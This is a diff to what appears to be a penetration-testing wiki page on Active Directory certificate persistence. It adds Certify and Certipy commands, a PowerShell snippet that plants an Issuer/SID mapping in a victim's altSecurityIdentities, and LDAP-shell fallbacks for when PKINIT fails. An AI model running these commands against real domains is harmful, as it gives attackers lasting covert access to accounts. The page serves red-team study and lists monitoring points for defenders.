@@ -14,6 +14,9 @@ Using [Certify](https://github.com/GhostPack/Certify) or [Certipy](https://githu
 # Enumerate client-auth capable templates
 Certify.exe find /clientauth
 
+# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
+Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins
+
 # Request a user cert from an Enterprise CA (current user context)
 Certify.exe request /ca:CA-SERVER\CA-NAME /template:User
 
@@ -44,7 +47,7 @@ If an attacker has elevated privileges on a host, they can enroll the compromise
 
 ```bash
 # Request a machine certificate as SYSTEM
-Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine
+Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine
 
 # Authenticate as the machine using the issued PFX
 Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
@@ -122,6 +125,27 @@ Notes
 - The cert chain must build to a root trusted by the DC. Enterprise CAs in NTAuth are typically trusted; some environments also trust public CAs.
 - Schannel authentication remains useful for persistence even when PKINIT fails because the DC lacks the Smart Card Logon EKU or returns `KDC_ERR_PADATA_TYPE_NOSUPP`.
 
+#### 2025+ `Issuer/SID` explicit mappings
+
+On **Windows Server 2022+** domain controllers patched with the **September 9, 2025** security update, Microsoft added another strong explicit mapping format that is attractive for persistence because it survives certificate reissuance from the same CA:
+
+```powershell
+# Same issuer formatting rules as Issuer+Serial
+$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
+$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
+$Map    = "X509:<I>$Issuer<SID>$SID"
+Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
+```
+
+Operationally this differs from the older strong formats:
+- `Issuer+Serial` pins **one exact certificate**.
+- `SKI` / `SHA1-PUKEY` pin **one keypair**.
+- `Issuer/SID` pins the **issuing CA + target SID**, so renewed or reissued certificates from the same CA keep working without rewriting `altSecurityIdentities`.
+
+Requirements and caveats
+- The certificate presented for logon must actually contain the target account SID in the SID security extension.
+- This format is not helpful for `ESC9` / `ESC16` style certificates that omit the SID extension; in those cases fall back to `Issuer+Serial`, `SKI`, or `SHA1-PUKEY`.
+
 For more on weak explicit mappings and attack paths, see:
 
 
@@ -152,12 +176,28 @@ Operational notes
 - Modern `Certipy` versions support both `-on-behalf-of` and `-renew`, so an attacker holding an Enrollment Agent PFX can mint and later renew leaf certificates without re-touching the original target account.
 - If PKINIT-based TGT retrieval is not possible, the resulting on-behalf-of certificate is still usable for Schannel authentication with `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.
 
+## Using Persisted Certificates When PKINIT Fails
+
+If the DC does not have a Smart Card Logon-capable certificate, certificate logon via PKINIT can fail with `KDC_ERR_PADATA_TYPE_NOSUPP`. That does **not** kill the persistence primitive: the same PFX is often still usable for Schannel-authenticated LDAP access.
+
+```bash
+# LDAPS / Schannel shell as the mapped principal
+certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
+
+# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
+certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
+```
+
+This is especially useful after PERSIST4/PERSIST5 because you can keep operating from Linux/macOS and chain other directory persistence actions such as dropping [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) or editing writable delegation attributes.
+
 ## 2025 Strong Certificate Mapping Enforcement: Impact on Persistence
 
-Microsoft KB5014754 introduced Strong Certificate Mapping Enforcement on domain controllers. Since February 11, 2025, DCs default to Full Enforcement, rejecting weak/ambiguous mappings. Practical implications:
+Microsoft KB5014754 introduced Strong Certificate Mapping Enforcement on domain controllers. Since **February 11, 2025**, DCs default to **Full Enforcement** for weak/ambiguous mappings, and as of the **September 9, 2025** security update patched DCs no longer support the old Compatibility-mode fallback. Practical implications:
 
 - Pre-2022 certificates that lack the SID mapping extension may fail implicit mapping when DCs are in Full Enforcement. Attackers can maintain access by either renewing certificates through AD CS (to obtain the SID extension) or by planting a strong explicit mapping in `altSecurityIdentities` (PERSIST4).
-- Explicit mappings using strong formats (Issuer+Serial, SKI, SHA1-PublicKey) continue to work. Weak formats (Issuer/Subject, Subject-only, RFC822) can be blocked and should be avoided for persistence.
+- Explicit mappings using strong formats (`Issuer+Serial`, `SKI`, `SHA1-PUKEY`, and on modern DCs `Issuer/SID`) continue to work. Weak formats (Issuer/Subject, Subject-only, RFC822) can be blocked and should be avoided for persistence.
+- If weak mappings still appear to work, assume you hit an unpatched or differently configured DC rather than a reliable long-term persistence path.
+- `ESC9` / `ESC16` style issuance paths that suppress the SID extension make `Issuer/SID` unusable, so fallback strong mappings or renewal via a normal template become the practical persistence option.
 
 Administrators should monitor and alert on:
 - Changes to `altSecurityIdentities` and issuance/renewals of Enrollment Agent and User certificates.
@@ -165,13 +205,11 @@ Administrators should monitor and alert on:
 
 ## References
 
-- Microsoft. KB5014754: Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings).
-  https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
-- SpecterOps. ADCS ESC14 Abuse Technique (explicit `altSecurityIdentities` abuse on user/computer objects).
-  https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/
-- Certipy Wiki – Command Reference (`req -renew`, `auth`, `shadow`).
-  https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
-- Almond Offensive Security. Authenticating with certificates when PKINIT is not supported.
-  https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html
+- [Microsoft Support – KB5014754: Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
+- [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
+- [GhostPack/Certify Wiki – Account Persistence Techniques](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
+- [Certipy Wiki – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
+- [Almond Offensive Security – Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
+- [Microsoft Community Hub – Introducing a new Issuer/SID AltSecID](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)
 
 {{#include ../../../banners/hacktricks-training.md}}
